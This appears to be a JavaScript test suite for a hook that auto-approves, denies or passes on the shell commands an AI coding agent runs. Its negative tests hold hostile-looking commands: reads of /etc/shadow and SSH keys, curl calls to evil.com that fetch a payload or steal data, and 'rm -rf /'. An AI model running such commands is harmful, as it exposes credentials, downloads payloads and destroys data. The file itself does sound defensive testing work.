testCommand('cd /c/Git/project && diff documentation/a.md documentation/b.md', 'allow', 'cd prefix + diff');
testCommand('diff documentation/a.md /etc/passwd', 'fallthrough', 'diff one safe + one unsafe = fallthrough');
testCommand('diff /etc/passwd /etc/shadow', 'fallthrough', 'diff two unsafe files = fallthrough');
testCommand('diff documentation/a.md documentation/b.md 2>/dev/null', 'allow', 'diff with 2>/dev/null');

// =============================================================================
// CAT piped to HEAD/TAIL
// =============================================================================
console.log('\nCat piped to head/tail');

testCommand('cat documentation/BRD.md | head -20', 'allow', 'cat safe-dir | head');
testCommand('cat web/src/app/page.tsx | tail -5', 'allow', 'cat safe-dir | tail');
testCommand('cat generated-docs/plan.md | head -n 50', 'allow', 'cat safe-dir | head -n 50');
testCommand('cat .claude/hooks/checker.ps1 | tail -c 100', 'allow', 'cat .claude | tail -c 100');
testCommand('cd /c/Git/project && cat documentation/file.md | head -5', 'allow', 'cd + cat safe-dir | head');
testCommand('cat documentation/file.md 2>/dev/null | tail -10', 'allow', 'cat safe-dir 2>/dev/null | tail');
testCommand('cat /etc/passwd | head -5', 'fallthrough', 'cat unsafe dir | head = fallthrough');
testCommand('cat documentation/file.md | head -5 | grep pattern', 'allow', 'cat | head | grep = allowed (pipeline splitting)');

// =============================================================================
// BASH COMMENTS - in compound commands
// =============================================================================
console.log('\nBash comments in compound commands');

testCommand("# Check BRD for authentication mentions\ntail -5 documentation/BRD.md", 'allow', 'comment + tail safe-dir (newline split)');
testCommand("# Install dependencies\nnpm install", 'allow', 'comment + npm install (newline split)');
testCommand("# Verify build\ncd web && npm run build", 'allow', 'comment + cd && npm run build (newline split)');
testCommand("# Step 1\nnpm install\n# Step 2\nnpm test", 'allow', 'multiple comments interspersed with commands');
testCommand('# just a comment', 'fallthrough', 'standalone comment = fallthrough (single cmd, no split)');

// =============================================================================
// DENY PATTERN CONSISTENCY
// =============================================================================
console.log('\nDeny pattern consistency');

testCommand('head secret.env', 'deny', 'head secret file = denied');
testCommand('tail private_key.pem', 'deny', 'tail private key file = denied');
testCommand('sed -n "1p" secret.json', 'deny', 'sed secret file = denied');
testCommand('awk "{print}" private.key', 'deny', 'awk private key file = denied');
testCommand('less secrets.yaml', 'deny', 'less secrets file = denied');
testCommand('more private_rsa_key.txt', 'deny', 'more private key file = denied');

// =============================================================================
// DENY SAFE-DIRECTORY EXCEPTION
// =============================================================================
console.log('\nDeny safe-directory exception');

testCommand('cat web/src/lib/secret-handler.ts', 'allow', 'cat safe-dir file with "secret" in name = allowed (safe dir + allow pattern)');
testCommand('head web/src/lib/secret-handler.ts', 'allow', 'head safe-dir file with "secret" in name = allowed');
testCommand('tail documentation/secrets-management-guide.md', 'allow', 'tail safe-dir file with "secret" in name = allowed');

testCommand('cat secret.env', 'deny', 'cat secret.env (no safe dir) = denied');
testCommand('head secret.env', 'deny', 'head secret.env (no safe dir) = denied');
testCommand('cat /tmp/secret.txt', 'deny', 'cat /tmp/secret.txt = denied');

testCommand('cat secret.env && cat documentation/safe.md', 'deny', 'cat secret.env && cat safe-dir = denied (secret sub-cmd caught)');

testCommand('cat web/src/private-key-handler.ts', 'allow', 'cat safe-dir file with "private.*key" = allowed');

// =============================================================================
// QUOTED PATHS WITH SPACES
// =============================================================================
console.log('\nQuoted paths with spaces');

testCommand('cat "documentation/My File.md"', 'allow', 'cat quoted path with spaces');
testCommand("cat 'documentation/My File.md'", 'allow', 'cat single-quoted path with spaces');
testCommand('type "documentation/My File.md"', 'allow', 'type quoted path with spaces');
testCommand('head -5 "documentation/My File.md"', 'allow', 'head quoted path with spaces');
testCommand('tail -n 20 "web/src/My Component.tsx"', 'allow', 'tail quoted path with spaces');
testCommand('wc -l "documentation/My File.md"', 'allow', 'wc quoted path with spaces');
testCommand('diff "documentation/Old File.md" "documentation/New File.md"', 'allow', 'diff two quoted paths with spaces');
testCommand('cat "documentation/My File.md" | grep "pattern"', 'allow', 'cat quoted with spaces | grep');
testCommand('sed -n "100,406p" "documentation/Api Definition.yaml"', 'allow', 'sed quoted path with spaces');
testCommand("sed -n '100,406p' /c/Git/test-repo/documentation/Api\\ Definition.yaml", 'allow', 'sed backslash-escaped space in path');
testCommand("cat /c/Git/test-repo/documentation/Api\\ Definition.yaml", 'allow', 'cat backslash-escaped space in path');
testCommand("head -100 /c/Git/test-repo/documentation/Api\\ Definition.yaml", 'allow', 'head backslash-escaped space in path');
testCommand("wc -l /c/Git/test-repo/documentation/Api\\ Definition.yaml", 'allow', 'wc backslash-escaped space in path');
testCommand("wc -l /c/Git/test-repo/documentation/Api\\ Definition.yaml && head -100 /c/Git/test-repo/documentation/Api\\ Definition.yaml", 'allow', 'wc + head compound with backslash-escaped spaces');
testCommand("grep -i pattern /c/Git/test-repo/documentation/Api\\ Definition.yaml", 'allow', 'grep backslash-escaped space in path');
testCommand("diff /c/Git/test-repo/documentation/Api\\ Definition.yaml /c/Git/test-repo/documentation/Other\\ File.yaml", 'allow', 'diff two backslash-escaped space paths');

testCommand('cat "/etc/My Secret.txt"', 'deny', 'cat quoted unsafe path with "secret" = denied');
testCommand('cat "/tmp/My File.txt"', 'fallthrough', 'cat quoted unsafe path (no deny keyword) = fallthrough');

// =============================================================================
// SPLITTER UNIT TESTS
// =============================================================================
console.log('\nSplitter unit tests');

// Extract splitCompoundCommand and splitPipeline from the script source
const scriptSource = fs.readFileSync(scriptPath, 'utf8');

function testSplitResult(fnName, input, expectedParts, description) {
  // We test splitters indirectly through the main script behavior
  // For direct unit tests, we'd need to export them.
  // Instead, run a tiny inline Node script that sources only the function.

  const helperScript = `
    'use strict';
    ${fnName === 'splitCompoundCommand' ? extractSplitCompoundCommand() : extractSplitPipeline()}
    const input = ${JSON.stringify(input)};
    const result = ${fnName}(input);
    process.stdout.write(JSON.stringify(result));
  `;

  let result;
  try {
    const output = execFileSync('node', ['-e', helperScript], { encoding: 'utf8', timeout: 5000 });
    result = JSON.parse(output);
  } catch (err) {
    failed++;
    errors.push(`FAIL: ${description} (exec error: ${err.message})`);
    console.log(`  \x1b[31mFAIL: ${description} (exec error)\x1b[0m`);
    return;
  }

  if (expectedParts === null) {
    if (result === null) {
      passed++;
      console.log(`  \x1b[32mPASS\x1b[0m: ${description}`);
    } else {
      failed++;
      const msg = `FAIL: ${description} (expected null, got ${Array.isArray(result) ? result.length + ' parts' : result})`;
      errors.push(msg);
      console.log(`  \x1b[31m${msg}\x1b[0m`);
    }
    return;
  }

  if (result === null) {
    failed++;
    const msg = `FAIL: ${description} (expected ${expectedParts.length} parts, got null)`;
    errors.push(msg);
    console.log(`  \x1b[31m${msg}\x1b[0m`);
    return;
  }

  if (result.length !== expectedParts.length) {
    failed++;
    const msg = `FAIL: ${description} (expected ${expectedParts.length} parts, got ${result.length}: ${result.join(' | ')})`;
    errors.push(msg);
    console.log(`  \x1b[31m${msg}\x1b[0m`);
    return;
  }

  for (let j = 0; j < result.length; j++) {
    if (result[j] !== expectedParts[j]) {
      failed++;
      const msg = `FAIL: ${description} (part ${j} expected '${expectedParts[j]}', got '${result[j]}')`;
      errors.push(msg);
      console.log(`  \x1b[31m${msg}\x1b[0m`);
      return;
    }
  }
  passed++;
  console.log(`  \x1b[32mPASS\x1b[0m: ${description}`);
}

function extractSplitCompoundCommand() {
  // Extract the function from the script source
  const start = scriptSource.indexOf('function splitCompoundCommand(');
  if (start === -1) return '// not found';
  let depth = 0;
  let end = start;
  let foundFirst = false;
  for (let i = start; i < scriptSource.length; i++) {
    if (scriptSource[i] === '{') { depth++; foundFirst = true; }
    if (scriptSource[i] === '}') { depth--; }
    if (foundFirst && depth === 0) { end = i + 1; break; }
  }
  return scriptSource.substring(start, end);
}

function extractSplitPipeline() {
  const start = scriptSource.indexOf('function splitPipeline(');
  if (start === -1) return '// not found';
  let depth = 0;
  let end = start;
  let foundFirst = false;
  for (let i = start; i < scriptSource.length; i++) {
    if (scriptSource[i] === '{') { depth++; foundFirst = true; }
    if (scriptSource[i] === '}') { depth--; }
    if (foundFirst && depth === 0) { end = i + 1; break; }
  }
  return scriptSource.substring(start, end);
}

// Compound splitter tests
testSplitResult('splitCompoundCommand', 'npm install && npm test', ['npm install', 'npm test'], 'simple && split');
testSplitResult('splitCompoundCommand', 'npm test || echo "failed"', ['npm test', 'echo "failed"'], 'simple || split');
testSplitResult('splitCompoundCommand', 'npm install ; npm run build', ['npm install', 'npm run build'], 'simple ; split');
testSplitResult('splitCompoundCommand', "npm install\nnpm test", ['npm install', 'npm test'], 'newline split');
testSplitResult('splitCompoundCommand', 'cd web && npm install && npm test', ['cd web', 'npm install', 'npm test'], 'three-way && split');
testSplitResult('splitCompoundCommand', 'echo "foo && bar"', null, 'quoted && returns null (single command)');
testSplitResult('splitCompoundCommand', "echo 'a ; b'", null, 'single-quoted ; returns null (single command)');
testSplitResult('splitCompoundCommand', '(npm test && npm build)', null, 'parenthesized group returns null (single command)');
testSplitResult('splitCompoundCommand', 'cat file | head -5', null, 'single pipe not split (returns null)');
testSplitResult('splitCompoundCommand', 'test -d node_modules && echo "ok" || npm install', ['test -d node_modules', 'echo "ok"', 'npm install'], 'mixed && and || split');
testSplitResult('splitCompoundCommand', "cat > /tmp/test.js << 'EOF'\nsome content\nEOF\nnpm test", ["cat > /tmp/test.js << 'EOF'\nsome content\nEOF", 'npm test'], 'heredoc body not split, newline after EOF splits');
testSplitResult('splitCompoundCommand', 'npm test', null, 'single command returns null');
testSplitResult('splitCompoundCommand', "# this is a comment\ntail -5 file.md", ['# this is a comment', 'tail -5 file.md'], 'comment + command split on newline');
testSplitResult('splitCompoundCommand', "# step 1\nnpm install\n# step 2\nnpm test", ['# step 1', 'npm install', '# step 2', 'npm test'], 'multiple comments and commands split on newlines');

// Pipeline splitter tests
console.log('\nPipeline splitter unit tests');

testSplitResult('splitPipeline', 'cat file | head -5', ['cat file', 'head -5'], 'simple pipe split');
testSplitResult('splitPipeline', 'cat file | grep pattern | head -5', ['cat file', 'grep pattern', 'head -5'], 'three-way pipe split');
testSplitResult('splitPipeline', 'npm test', null, 'no pipe returns null');
testSplitResult('splitPipeline', 'npm test || echo "failed"', null, '|| is not a pipe split (returns null)');
testSplitResult('splitPipeline', 'echo "foo | bar" | grep baz', ['echo "foo | bar"', 'grep baz'], 'quoted pipe not split');
testSplitResult('splitPipeline', "echo 'a | b' | wc -l", ["echo 'a | b'", 'wc -l'], 'single-quoted pipe not split');
testSplitResult('splitPipeline', 'cat file | sort | uniq | wc -l', ['cat file', 'sort', 'uniq', 'wc -l'], 'four-way pipe split');

// =============================================================================
// REDIRECT STRIPPING
// =============================================================================
console.log('\nRedirect stripping');

testCommand('git status 2>&1', 'allow', 'git status 2>&1 = allowed (redirect stripped)');
testCommand('git log --oneline -5 2>&1', 'allow', 'git log 2>&1 = allowed');
testCommand('git diff 2>/dev/null', 'allow', 'git diff 2>/dev/null = allowed');
testCommand('npm test 2>&1', 'allow', 'npm test 2>&1 = allowed');
testCommand('ls -la web/src/ 2>&1', 'allow', 'ls safe dir 2>&1 = allowed');
testCommand('cat web/src/app/page.tsx 2>&1', 'allow', 'cat safe-dir 2>&1 = allowed');
testCommand('find .claude -name "*.json" 2>&1', 'allow', 'find safe-dir 2>&1 = allowed');
testCommand('npx vitest --run 2>&1', 'allow', 'npx vitest 2>&1 = allowed');

testCommand('cat ~/.ssh/id_rsa 2>&1', 'deny', 'cat SSH key 2>&1 = still denied');
testCommand('git push --force 2>&1', 'deny', 'git push --force 2>&1 = still denied');

testCommand('git add . 2>&1 && git status 2>&1', 'allow', 'compound with 2>&1 on each sub-command');

// =============================================================================
// WINDOWS START - open file in default app (safe dirs only)
// =============================================================================
console.log('\nWindows start command');

testCommand('start "" "c:/Users/dev/projects/my-app/generated-docs/dashboard.html"', 'allow', 'start dashboard (absolute path)');
testCommand('start "" "generated-docs/dashboard.html"', 'allow', 'start dashboard (relative path)');
testCommand('start "" "/c/Git/stadium-8/generated-docs/dashboard.html"', 'allow', 'start dashboard (absolute Unix path)');
testCommand('start "" generated-docs/dashboard.html', 'allow', 'start dashboard (no quotes)');
testCommand('start "" "web/src/app/page.tsx"', 'allow', 'start web file');
testCommand('start "" ".claude/hooks/checker.js"', 'allow', 'start .claude file');
testCommand('start "" "c:/Windows/System32/cmd.exe"', 'fallthrough', 'start unsafe path = fallthrough');
testCommand('start "" "/tmp/evil.sh"', 'fallthrough', 'start /tmp file = fallthrough');

// =============================================================================
// PIPELINE SPLITTING
// =============================================================================
console.log('\nPipeline splitting');

testCommand('cat web/src/app/page.tsx | grep "import"', 'allow', 'cat safe-dir | grep pattern');
testCommand('cat documentation/BRD.md | wc -l', 'allow', 'cat safe-dir | wc -l');
testCommand('cat web/package.json | sort', 'allow', 'cat safe-dir | sort');
testCommand('cat web/package.json | sort | uniq', 'allow', 'cat safe-dir | sort | uniq');
testCommand('cat documentation/BRD.md | grep "API" | wc -l', 'allow', 'cat | grep | wc pipeline');
testCommand('cat documentation/BRD.md | head -20 | tail -5', 'allow', 'cat | head | tail pipeline');

// cat / od / xxd as pipeline-tail filters (no file arg)
testCommand('cd C:/Git/00-Stadium-8-test-repos/stadium-8-test-run-23/web && sed -n \'12,14p\' src/mocks/handlers.ts | cat -A', 'allow', 'cd + sed safe-dir | cat -A');
testCommand('cat web/src/app/page.tsx | cat -A', 'allow', 'cat safe-dir | cat -A');
testCommand('cat web/src/app/page.tsx | cat -n', 'allow', 'cat safe-dir | cat -n (line numbers)');
testCommand('cat web/src/app/page.tsx | cat -vET', 'allow', 'cat safe-dir | cat -vET (combined flags)');
testCommand('cat /etc/passwd | cat -A', 'fallthrough', 'cat unsafe file | cat -A = fallthrough (unsafe upstream)');
testCommand('cat web/src/app/page.tsx | od -c', 'allow', 'cat safe-dir | od -c');
testCommand('cat web/src/app/page.tsx | od -An -tx1', 'allow', 'cat safe-dir | od with flags');
testCommand('cat web/src/app/page.tsx | xxd', 'allow', 'cat safe-dir | xxd');
testCommand('cat web/src/app/page.tsx | xxd -l 64', 'allow', 'cat safe-dir | xxd -l 64 (limit bytes)');
testCommand('cat /etc/passwd | xxd', 'fallthrough', 'cat unsafe file | xxd = fallthrough (unsafe upstream)');

// Next.js dynamic-route bracket paths ([id], [...slug], [[...slug]])
testCommand('ls "C:\\Git\\00-Stadium-8-test-repos\\stadium-8-test-run-23\\web\\src\\app\\api\\auth\\[...nextauth]\\\\"', 'allow', 'ls quoted Windows path with NextAuth catch-all bracket route');
testCommand('ls web/src/app/api/auth/[...nextauth]/', 'allow', 'ls forward-slash path with bracket catch-all');
testCommand('ls web/src/app/[id]/', 'allow', 'ls dynamic [id] route');
testCommand('ls web/src/app/[[...slug]]/', 'allow', 'ls optional catch-all [[...slug]] route');
testCommand('cat web/src/app/api/auth/[...nextauth]/route.ts', 'allow', 'cat file inside [...nextauth] dir');
testCommand('cat "web/src/app/api/auth/[...nextauth]/route.ts"', 'allow', 'cat quoted file inside [...nextauth] dir');
testCommand('grep "import" web/src/app/api/auth/[...nextauth]/route.ts', 'allow', 'grep file inside [...nextauth] dir');
testCommand('head -20 web/src/app/[id]/page.tsx', 'allow', 'head file inside [id] dir');
testCommand('cd web/src/app/api/auth/[...nextauth] && pwd', 'allow', 'cd into [...nextauth] dir then pwd');
testCommand('cd "C:/Git/project/web/src/app/[...slug]" && ls', 'allow', 'cd quoted Windows path into bracket dir then ls');
testCommand('find web/src/app/api/auth/[...nextauth] -name "*.ts"', 'allow', 'find inside [...nextauth] dir');
testCommand('mkdir -p web/src/app/api/auth/[...nextauth]', 'allow', 'mkdir [...nextauth] dir');

// Bracket paths still respect credential-file deny patterns
testCommand('cat web/src/app/api/auth/[...nextauth]/.env', 'deny', 'cat .env inside [...nextauth] still denied');

// User-reported prompt: transition-phase + dashboard-html chain (should auto-approve)
testCommand('cd "c:/Git/00-Stadium-8-test-repos/stadium-8-test-run-23" && node .claude/scripts/transition-phase.js --set-e2e-status passed-after-fix --epic 1 --story 1 --e2e-pass 6 --e2e-fail 0 2>&1 | head -10 && cd "c:/Git/00-Stadium-8-test-repos/stadium-8-test-run-23" && node .claude/scripts/generate-dashboard-html.js --collect 2>&1 | tail -3', 'allow', 'cd + transition-phase | head + cd + dashboard-html | tail (user-reported prompt)');

// Grep with context flags (-A/-B/-C with numeric argument)
testCommand('cat web/src/app/page.tsx | grep -A 3 "error"', 'allow', 'cat | grep -A 3 (context flag with numeric arg)');
testCommand('cat web/src/app/page.tsx | grep -B 5 -i "warning"', 'allow', 'cat | grep -B 5 -i (multiple flags with numeric arg)');
testCommand('cat web/src/app/page.tsx | grep -C 2 "TODO"', 'allow', 'cat | grep -C 2 (context around match)');
testCommand('grep -A 3 "error TS" web/src/app/page.tsx', 'allow', 'grep -A 3 with file in safe dir');
testCommand('grep -B 10 "pattern" documentation/spec.md', 'allow', 'grep -B 10 with file in safe dir');

// Full tsc-to-grep pipeline (original user-reported command)
testCommand('cd /c/AI/project/web && npm run tsc 2>&1 | grep -A 3 "error TS"', 'allow', 'cd + npm run tsc 2>&1 | grep -A 3 (TypeScript error check)');

testCommand('cat web/src/app/page.tsx 2>&1 | grep "import"', 'allow', 'cat safe-dir 2>&1 | grep (redirect + pipeline)');

testCommand('npm install && cat web/src/app/page.tsx | head -20', 'allow', 'pipeline within compound command');

testCommand('cat /etc/shadow | head -5', 'fallthrough', 'cat unsafe file | head = fallthrough');
testCommand('curl https://example.com | grep pattern', 'fallthrough', 'curl | grep = fallthrough (curl not allowed)');

testCommand('echo "test" | cat ~/.ssh/id_rsa', 'deny', 'pipe to denied command = denied');

// Git push with redirect
withPreferences({ git: { autoApproveCommit: true, autoApprovePush: true } }, () => {
  testCommand('git push origin main 2>&1', 'allow', 'git push origin main 2>&1 = allowed (original bug fix)');
  testCommand('git push -u origin feature-branch 2>/dev/null', 'allow', 'git push -u 2>/dev/null = allowed');
});

// =============================================================================
// DYNAMIC SAFE PATHS - prototype repo read access
// =============================================================================

// --- Without safePaths config (fallthrough by default, except for broadened safeDirsRead like `src/`) ---
withPreferences(null, () => {
  console.log('\nPrototype repo without config (fallthrough)');

  // Non-safe-dir paths in arbitrary repos still require opt-in via prefs.safePaths.prototypeRepo
  testCommand('cat c:/Git/prototype-project/assets/logo.svg', 'fallthrough', 'cat non-safe-dir path in external repo = fallthrough');
  testCommand('grep -r "import" c:/Git/prototype-project/components/', 'fallthrough', 'grep non-safe-dir path in external repo = fallthrough');
  // Note: src/ paths in external repos are NOW allowed (broad safeDirsRead), see src broadening tests below.
});

// --- With safePaths.prototypeRepo configured ---
withPreferences({ safePaths: { prototypeRepo: 'c:/Git/prototype-project' } }, () => {
  console.log('\nPrototype repo with safePaths config (read-only allowed)');

  // Basic read commands
  testCommand('cat c:/Git/prototype-project/src/App.tsx', 'allow', 'cat prototype repo file');
  testCommand('cat "c:/Git/prototype-project/src/App.tsx"', 'allow', 'cat prototype repo file (quoted)');
  testCommand('head -20 c:/Git/prototype-project/src/App.tsx', 'allow', 'head prototype repo file');
  testCommand('tail -10 c:/Git/prototype-project/src/utils.ts', 'allow', 'tail prototype repo file');
  testCommand('grep -r "import" c:/Git/prototype-project/src/', 'allow', 'grep prototype repo');
  testCommand('wc -l c:/Git/prototype-project/src/App.tsx', 'allow', 'wc prototype repo file');
  testCommand('ls c:/Git/prototype-project/src/', 'allow', 'ls prototype repo directory');
  testCommand('ls -la c:/Git/prototype-project/', 'allow', 'ls -la prototype repo root');
  testCommand('find c:/Git/prototype-project/src -name "*.tsx"', 'allow', 'find in prototype repo');

  // Quoted paths with spaces
  testCommand('cat "c:/Git/prototype-project/src/my component.tsx"', 'allow', 'cat prototype repo file with spaces (quoted)');

  // Pipeline with prototype repo
  testCommand('cat c:/Git/prototype-project/src/App.tsx | grep "import"', 'allow', 'cat prototype repo | grep pipeline');
  testCommand('grep -r "export" c:/Git/prototype-project/src/ | wc -l', 'allow', 'grep prototype repo | wc pipeline');

  // Node import scripts reading from prototype repo
  testCommand('node .claude/scripts/import-prototype.js --from c:/Git/prototype-project', 'allow', 'node import script with prototype repo arg');

  // Windows backslash paths
  testCommand('cat c:\\Git\\prototype-project\\src\\App.tsx', 'allow', 'cat prototype repo (backslash path)');
  testCommand('type c:\\Git\\prototype-project\\src\\App.tsx', 'allow', 'type prototype repo (backslash path)');

  // Safety: write commands should NOT be auto-approved
  testCommand('sed -i "s/foo/bar/" c:/Git/prototype-project/src/App.tsx', 'fallthrough', 'sed -i prototype repo = fallthrough (write not allowed)');
  testCommand('rm c:/Git/prototype-project/src/App.tsx', 'fallthrough', 'rm prototype repo file = fallthrough');

  // Safety: find with -exec should NOT be auto-approved
  testCommand('find c:/Git/prototype-project/src -name "*.tsx" -exec cat {} \\;', 'fallthrough', 'find prototype repo with -exec = fallthrough');
  testCommand('find c:/Git/prototype-project/src -delete', 'fallthrough', 'find prototype repo with -delete = fallthrough');

  // Safety: other paths still not allowed (non-safe-dir paths)
  testCommand('cat c:/Git/other-project/assets/logo.svg', 'fallthrough', 'cat non-safe-dir path in different repo = fallthrough');
  testCommand('cat /etc/passwd', 'fallthrough', 'cat /etc/passwd still fallthrough');
  // Note: `src/` in a different repo is allowed via safeDirsRead, intentionally.
});

// =============================================================================
// TASKLIST - process listing (read-only)
// =============================================================================
console.log('\nTasklist commands');

testCommand('tasklist', 'allow', 'tasklist (no flags)');
testCommand('tasklist /FI "IMAGENAME eq node.exe"', 'allow', 'tasklist with filter');
testCommand('tasklist /FO CSV', 'allow', 'tasklist with format flag');
testCommand('tasklist /V', 'allow', 'tasklist verbose');
testCommand('tasklist 2>/dev/null | grep -i node || true', 'allow', 'tasklist | grep node || true');
testCommand('cd c:/Git/project/web && tasklist /FI "IMAGENAME eq node.exe"', 'allow', 'cd prefix + tasklist');

// =============================================================================
// .NEXT DIRECTORY - build output reading (safe dir)
// =============================================================================
console.log('\n.next directory reading');

testCommand('cat .next/dev/trace', 'allow', 'cat .next trace file');
testCommand('cat .next/server/app/page.js', 'allow', 'cat .next server output');
testCommand('ls .next/server/chunks/', 'allow', 'ls .next chunks directory');
testCommand('head -50 .next/dev/trace', 'allow', 'head .next trace file');
testCommand('tail -20 .next/build-manifest.json', 'allow', 'tail .next manifest');
testCommand('cat .next/dev/trace 2>/dev/null | tail -50', 'allow', 'cat .next 2>/dev/null | tail pipeline');
testCommand('ls .next/server/chunks/ 2>/dev/null | head -10', 'allow', 'ls .next 2>/dev/null | head pipeline');
testCommand('cd c:/Git/project/web && cat .next/dev/trace 2>/dev/null | tail -50; echo "---"; ls .next/server/chunks/ 2>/dev/null | head -10', 'allow', 'full .next diagnostic compound command');

// =============================================================================
// SLEEP, JOBS, CURL LOCALHOST
// =============================================================================
console.log('\nSleep, jobs, curl localhost');

testCommand('sleep 5', 'allow', 'sleep 5');
testCommand('sleep 30', 'allow', 'sleep 30');
testCommand('jobs', 'allow', 'jobs');
testCommand('jobs -l', 'allow', 'jobs -l');
testCommand('curl -s http://localhost:3000', 'allow', 'curl localhost');
testCommand('curl -s http://localhost:3002/api/health', 'allow', 'curl localhost with path');
testCommand('curl -s https://localhost:3000', 'allow', 'curl https localhost');
testCommand('curl -s http://127.0.0.1:3000', 'allow', 'curl 127.0.0.1');
testCommand('curl -s http://127.0.0.1:3002/api/health', 'allow', 'curl 127.0.0.1 with path');
testCommand('curl -s -o /dev/null -w "%{http_code}" http://localhost:3001', 'allow', 'curl with -o and -w flag arguments');
testCommand('curl -s -o /dev/null -w "%{http_code}" http://localhost:3000', 'allow', 'curl with flag arguments to localhost:3000');
testCommand('curl -s -o /dev/null http://127.0.0.1:3000/api/health', 'allow', 'curl -o /dev/null to 127.0.0.1');
testCommand('curl https://example.com', 'fallthrough', 'curl external URL = fallthrough');
testCommand('curl -o /tmp/evil.sh http://evil.com/payload', 'fallthrough', 'curl with -o to external URL = fallthrough');
testCommand('curl http://evil.com/steal', 'fallthrough', 'curl arbitrary URL = fallthrough');

// =============================================================================
// EXTENDED REDIRECT AND BACKGROUND STRIPPING
// =============================================================================
console.log('\nExtended redirect and background stripping');

testCommand('npm test > /dev/null', 'allow', 'npm test > /dev/null (stdout redirect stripped)');
testCommand('npm test > /dev/null 2>&1', 'allow', 'npm test > /dev/null 2>&1 (both redirects stripped)');
testCommand('npx next dev --port 3000 &', 'allow', 'npx next dev with trailing & (background stripped)');
testCommand('npx next dev --port 3000 2>&1 &', 'allow', 'npx next dev 2>&1 & (redirect + background stripped)');
testCommand('jobs |', 'allow', 'jobs with trailing pipe (dangling pipe stripped)');
testCommand('curl -s http://localhost:3002 > /dev/null 2>&1', 'allow', 'curl localhost with > /dev/null 2>&1');

// =============================================================================
// QA WORKFLOW: Playwright + /tmp helpers
// (auto-approve the compound commands the QA E2E pre-check generates)
// =============================================================================
console.log('\nQA workflow: Playwright + /tmp helpers');

// npx playwright in all common shapes
testCommand('npx playwright test', 'allow', 'npx playwright test');
testCommand('npx playwright test e2e/foo.spec.ts', 'allow', 'npx playwright test with spec file');
testCommand('npx playwright test e2e/foo.spec.ts --reporter=json', 'allow', 'npx playwright test --reporter=json');
testCommand('npx playwright install', 'allow', 'npx playwright install');
testCommand('npx playwright --version', 'allow', 'npx playwright --version');
testCommand('cd web && npx playwright test', 'allow', 'cd web && npx playwright test');
testCommand('cd C:/Git/project/web && npx playwright test e2e/foo.spec.ts', 'allow', 'cd absolute path && npx playwright test');

// `> /tmp/<flat-file>` redirect stripping (new) — exercise it with a strict-pattern
// command (`pwd`) so the strip-rule is the only thing keeping it allowed. Loose-pattern
// commands like `npm test` already accept arbitrary trailing content via `(?:\s+.*)?$`,
// so they don't actually exercise the new strip-rule.
testCommand('pwd > /tmp/output.log', 'allow', 'pwd > /tmp/<flat-file> (strip-rule active)');
testCommand('pwd > /tmp/e2e-report.json 2>&1', 'allow', 'pwd > /tmp/file 2>&1 (both strips compose)');
testCommand('pwd 2>/tmp/err.log', 'allow', 'pwd 2>/tmp/err.log (stderr-only tmp redirect)');
testCommand('pwd &> /tmp/all.log', 'allow', 'pwd &> /tmp/all.log (combined redirect)');
testCommand('npx playwright test > /tmp/e2e-report.json 2>&1', 'allow', 'playwright > /tmp + 2>&1 (real QA shape)');

// /tmp strip-rule boundaries — flat /tmp/<name> only, no traversal, no subdirs, no other dirs
testCommand('pwd > /tmp/../etc/passwd', 'fallthrough', 'pwd > /tmp/../etc/passwd traversal NOT stripped');
testCommand('pwd > /tmp/sub/file.log', 'fallthrough', 'pwd > /tmp/<subdir>/file NOT stripped (flat only)');
testCommand('pwd > /var/log/anything', 'fallthrough', 'pwd > non-/tmp NOT stripped');
testCommand('pwd > /tmp/', 'fallthrough', 'pwd > /tmp/ (no filename) NOT stripped');

// `rm -f /tmp/<flat-file>` allow (new)
testCommand('rm -f /tmp/e2e-report.json', 'allow', 'rm -f /tmp/e2e-report.json');
testCommand('rm -f /tmp/anything.log', 'allow', 'rm -f /tmp/anything.log');
testCommand('rm -f "/tmp/quoted-name.txt"', 'allow', 'rm -f /tmp quoted name');
testCommand('cd web && rm -f /tmp/cleanup.json', 'allow', 'cd prefix + rm -f /tmp/<file>');

// rm -f safety boundaries
testCommand('rm -f /tmp/../etc/passwd', 'fallthrough', 'rm -f /tmp/../etc/passwd traversal NOT auto-approved');
testCommand('rm -f /tmp/sub/file', 'fallthrough', 'rm -f /tmp/<subdir>/file NOT auto-approved');
testCommand('rm -f /etc/hosts', 'fallthrough', 'rm -f outside /tmp NOT auto-approved');
testCommand('rm -f *', 'fallthrough', 'rm -f * (cwd glob) NOT auto-approved');
testCommand('rm -rf /tmp/foo', 'deny', 'rm -rf /tmp/foo still denied (rm -rf / pattern)');

// End-to-end: representative compound shapes the QA E2E step emits
testCommand(
  'cd web && npx playwright test e2e/foo.spec.ts --reporter=json > /tmp/e2e-report.json 2>&1; echo "EXIT:$?"',
  'allow',
  'shape A: relative cd + single-spec playwright + > /tmp + ; echo'
);
testCommand(
  'cd C:/Git/project/web && npx playwright test e2e/foo.spec.ts e2e/bar.spec.ts e2e/baz.spec.ts --workers=2 --reporter=json > /tmp/e2e-report.json 2>&1; echo "EXIT_CODE=$?"',
  'allow',
  'shape B: absolute cd + multi-spec playwright + > /tmp + ; echo'
);
testCommand(
  'rm -f /tmp/e2e-report.json && ls /tmp/e2e-report.json 2>&1; echo "---"; cd web && npx playwright test e2e/foo.spec.ts --reporter=json 2>/dev/null > /tmp/e2e-report.json; echo "EXIT:$?"; ls -la /tmp/e2e-report.json',
  'allow',
  'shape C: rm -f && ls 2>&1; echo; cd web && playwright 2>/dev/null > /tmp; echo; ls -la'
);

// Defense in depth: dangerous things in compound playwright commands still deny
testCommand(
  'cd web && npx playwright test; rm -rf /',
  'deny',
  'playwright followed by rm -rf / = denied (deny pattern catches it)'
);

// =============================================================================
// QUOTED ENV VAR PREFIX
// =============================================================================
console.log('\nQuoted env var prefix');

testCommand('NODE_OPTIONS="--trace-warnings" npx next dev --port 3002', 'allow', 'env var with quoted value + npx next');
testCommand('NODE_ENV="production" npm run build', 'allow', 'NODE_ENV quoted + npm run build');
testCommand('FOO=bar npm test', 'allow', 'unquoted env var + npm test (still works)');

// =============================================================================
// FULL AGENT DIAGNOSTIC COMMAND
// =============================================================================
console.log('\nFull agent diagnostic command');

testCommand('cd c:/Git/project/web && NODE_OPTIONS="--trace-warnings" npx next dev --port 3002 2>&1 &\nsleep 8\ncurl -s http://localhost:3002 > /dev/null 2>&1\nsleep 3\njobs |\n# Capture whatever was printed to stderr/stdout', 'allow', 'full agent diagnostic: dev server + sleep + curl localhost + jobs');
testCommand('sleep 15 && curl -s -o /dev/null -w "%{http_code}" http://localhost:3001 2>&1; curl -s -o /dev/null -w "%{http_code}" http://localhost:3000 2>&1', 'allow', 'sleep + curl with -o -w flags to two localhost ports');

